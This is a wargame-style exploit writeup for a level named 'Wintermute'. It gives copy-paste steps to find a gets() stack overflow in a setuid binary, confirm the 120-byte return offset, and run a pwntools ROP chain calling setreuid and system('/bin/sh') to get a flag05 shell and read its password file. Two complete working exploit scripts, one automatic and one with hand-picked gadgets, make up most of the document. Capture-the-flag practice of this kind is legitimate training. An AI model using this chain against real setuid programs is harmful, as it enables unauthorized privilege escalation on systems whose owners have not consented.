# Wintermute (level05 → flag05) — Exploit Writeup

Copy-paste each block in order, in a terminal on the target box (`level05` user).

## 1. Recon the binary

```bash
file /home/level05/wintermute
checksec --file=/home/level05/wintermute
ls -la /home/level05/wintermute
```

Expect: amd64, dynamically linked, No PIE, no canary, NX enabled, Partial RELRO, SHSTK/IBT present (but not necessarily runtime-enforced), owner `flag05` with setuid bit (`-rwsr-x---`).

## 2. Find the vulnerability

```bash
objdump -d /home/level05/wintermute | less
```

`run_query()` calls `gets(query)` on a fixed-size stack buffer with **no bounds checking** — classic stack buffer overflow. Frame size is `sub rsp, 0x70` (112 bytes reserved above saved RBP).

## 3. Confirm the exact offset to the return address

`p.corefile` won't work on this box (apport owns core dumps and blocks read access), so do it via GDB manually.

```bash
python3 -c "from pwn import cyclic; open('/tmp/pattern','wb').write(cyclic(300))"
gdb -nx /home/level05/wintermute
```

Inside GDB:
```
run < /tmp/pattern
info registers rbp rip
```

Take the leaked `rbp` value and compute the offset:
```bash
python3 -c "
from pwn import cyclic_find, p64, context
context.arch = 'amd64'
val = 0x6261616562616164   # replace with your actual leaked rbp value
print('Offset to saved RBP:', cyclic_find(p64(val)))
print('Offset to return address:', cyclic_find(p64(val)) + 8)
"
```

**Confirmed for this binary: offset = 120 bytes.**

## 4. Check ASLR and identify the real libc

```bash
cat /proc/sys/kernel/randomize_va_space   # expect 0 (off)
ldd /home/level05/wintermute              # shows real libc path + load base
```

Confirmed: libc loaded at `0x7ffff7c00000`, binary uses `/lib/x86_64-linux-gnu/libc.so.6` (same file as `/usr/lib/x86_64-linux-gnu/libc.so.6` on this box — typically a symlink).

**Note:** even with `randomize_va_space=0`, setuid binaries can occasionally get a different address layout on exec due to kernel exec-hardening for privileged processes — if a payload with hardcoded addresses only works *some* of the time, that's the usual cause, not a bug in your logic.

## 5. Confirm the target UID

```bash
grep flag05 /etc/passwd
```
→ UID `1022`.

## 6. The exploit — use pwntools' automatic ROP builder, not hand-picked gadgets

**Why:** a hand-typed gadget chain (copying hex addresses from `ROPgadget`/`readelf` output by hand) is fragile — it's easy for one stale or mistyped offset to linger from an earlier debugging iteration, and a single wrong byte in a gadget address sends the chain into garbage. `ROP(libc)` instead resolves every address from the **actual libc file's real symbol table and contents** at run time, so nothing is hardcoded or guessable-wrong.

```python
from pwn import *

context.arch = 'amd64'

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc.address = 0x7ffff7c00000

OWNER_UID = 1022   # confirmed flag05 UID
offset    = 120    # confirmed return-address offset

rop = ROP(libc, badchars=b'\n')   # avoid gadgets containing 0x0a — gets() stops at newline
rop.setreuid(OWNER_UID, OWNER_UID)
rop.raw(rop.ret)                   # stack alignment fix before system()
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = b'\x00' * offset + rop.chain()

p = process("/home/level05/wintermute", env={})
p.recvuntil(b"[WINTERMUTE] Query: ")
p.sendline(payload)
p.interactive()
```

Run it:
```bash
python3 exploit.py
```

## 7. Get the flag

Once the shell spawns:
```bash
id
cat /home/flag05/.pass
```
`id` should show `uid=1022(flag05)`.

---

## If you still want to understand the manual gadget chain (optional, for learning)

Same exploit, built from individually chosen gadgets — more fragile, but shows exactly what `ROP()` automates for you:

```python
from pwn import *

context.arch = 'amd64'

libc = 0x7ffff7c00000

ROP_RDI      = p64(libc + 0x000000000010c08d)  # pop rdi ; ret
ROP_RSI      = p64(libc + 0x0000000000110b7d)  # pop rsi ; ret
ROP_RET      = p64(libc + 0x0000000000028a92)  # ret (alignment)

ROP_SH       = p64(libc + 0x00000000001cc42f)  # "/bin/sh"
ROP_SYS      = p64(libc + 0x0000000000058750)  # system()
ROP_SETREUID = p64(libc + 0x0000000000127370)  # setreuid()
ROP_EXIT     = p64(libc + 0x0000000000047ba0)  # exit()

OWNER_UID    = p64(1022)
offset       = 120

rop_chain  = ROP_RDI + OWNER_UID + ROP_RSI + OWNER_UID + ROP_SETREUID
rop_chain += ROP_RET                     # alignment fix before system()
rop_chain += ROP_RDI + ROP_SH + ROP_SYS
rop_chain += ROP_RDI + p64(0) + ROP_EXIT

payload = b'A' * offset + rop_chain

p = process("/home/level05/wintermute", env={})
p.recvuntil(b"[WINTERMUTE] Query: ")
p.sendline(payload)
p.interactive()
```

Every address here must come from **your own verified** `ROPgadget`/`readelf`/`strings` output against the exact libc this binary loads — never reuse hex values from a different box, a different libc build, or an earlier draft without re-checking.

## Key lessons

- **Prefer `pwnlib.rop.ROP` + symbol-based calls (`rop.setreuid(...)`, `rop.system(...)`, `libc.search(...)`) over hand-typed gadget addresses.** It removes an entire class of "stale hardcoded offset" bugs.
- **`cyclic()` + `cyclic_find()`** is the reliable way to confirm a stack offset instead of trusting disassembly arithmetic alone.
- **`badchars=b'\n'` matters whenever the input function stops at a newline** (`gets`, `fgets`, line-buffered reads) — any gadget/address containing `0x0a` would silently truncate your payload.
- **Setuid binaries can get randomized addresses even with `randomize_va_space=0`.** If a payload with fixed addresses works intermittently, that's the usual explanation — not a logic bug. A retry loop is a legitimate practical workaround if this persists.
- **GDB with `-nx`** (no plugins/scripts) plus `run < /tmp/payload` is a reliable way to debug a setuid binary without needing tmux or a GUI terminal, and without relying on core dumps (which may be blocked by `apport` on Ubuntu-based boxes).
